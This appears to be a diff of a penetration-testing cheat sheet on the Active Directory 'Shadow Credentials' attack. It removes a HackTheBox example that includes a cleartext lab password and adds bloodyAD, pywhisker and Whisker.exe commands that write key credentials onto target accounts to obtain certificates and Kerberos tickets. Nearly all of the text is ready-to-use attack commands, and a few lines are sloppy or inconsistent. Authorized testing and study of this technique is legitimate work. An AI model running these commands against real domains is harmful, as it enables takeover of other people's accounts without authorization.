@@ -8,15 +8,32 @@
 - The environment must accept certificate/PKINIT authentication for the account (many do, especially when Windows Hello for Business or certificate authentication is in use).
 
 
-### How to use:
+### From linux
+#### bloodyAD
+```sh
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" add shadowCredentials targetpc$
+bloodyAD -k --host "$DC" -u "$USER" -d "$DOMAIN" --dc-ip "$IP" remove shadowCredentials targetpc$ --key <key from previous output>
 ```
-pywhisker -d 'puppy.htb' --dc-ip 10.10.11.70 -u 'ant.edwards' -p 'Antman2025!' -k --target 'adam.silver' --action 'add'
 
-[+] Updated the msDS-KeyCredentialLink attribute of the target object
-[+] Saved PFX (#PKCS12) certificate & key at path: cQ4tqYLC.pfx
-[*] Must be used with password: qkCIOcztu0MWvQuuUbDS
+#### pywhisker
+```sh
+# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "list"
+# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
+python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "add" --filename "test1"
+# Removes a key credential from the target object specified by a DeviceID GUID.
+python3 pywhisker.py -d "domain.local" -u "user1" -p "complexpassword" --target "user2" --action "remove" --device-id "a8ce856e-9b58-61f9-8fd3-b079689eb46e"
 ```
+
 Now you got certificate, you can use it to get TGT then do what ever you want:
-```
-
+### From windows
+```powershell
+# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object.
+Whisker.exe list /target:computername$
+# Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device.
+Whisker.exe add /target:"TARGET_SAMNAME" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /path:"cert.pfx" /password:"pfx-password"
+Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\path\to\file.pfx /password:P@ssword1]
+# Removes a key credential from the target object specified by a DeviceID GUID.
+Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b
 ```
